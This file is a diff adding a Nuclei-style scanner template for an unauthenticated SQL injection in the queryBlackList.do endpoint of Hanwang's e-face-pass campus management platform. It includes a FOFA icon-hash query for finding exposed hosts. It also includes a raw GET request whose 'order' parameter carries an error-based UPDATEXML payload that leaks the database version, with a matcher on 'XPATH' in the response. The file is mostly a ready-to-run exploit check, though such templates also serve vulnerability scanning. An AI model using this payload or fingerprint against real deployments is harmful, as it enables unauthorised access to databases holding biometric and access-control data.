@@ -1,0 +1,24 @@
+id: hanwang-facepass-queryblacklist-sqli
+
+info:
+  name: 汉王e脸通综合管理平台queryBlackList.do接口SQL注入漏洞
+  author: 0dayPoc
+  severity: high
+  description: |-
+    fofa: icon_hash="1380907357"
+      汉王e脸通综合管理平台是汉王科技开发的生物识别智慧园区管理系统，集成考勤、门禁、访客等八大功能模块，采用无接触式通行技术，部署于政府、企业等场景。其queryBlackList.do接口存在SQL注入缺陷，攻击者可利用未经验证的输入参数构造恶意SQL语句，在无需身份认证的情况下实现数据库敏感信息提取、数据篡改及权限提升，直接威胁系统数据的安全性与完整性。
+  tags: 汉王e脸通综合管理平台
+
+http:
+- raw:
+  - |
+    GET /manage/systemBlackList/queryBlackList.do?recoToken=67mds2pxXQb&page=1&pageSize=10&order=(UPDATEXML(2920,CONCAT(0x7e,@@version,(SELECT+(ELT(2920=2920,1))),0x7e),8357)) HTTP/1.1
+    Host: {{Hostname}}
+  matchers-condition: and
+  matchers:
+  - type: status
+    status: [200]
+  - type: word
+    part: body
+    words:
+    - 'XPATH'
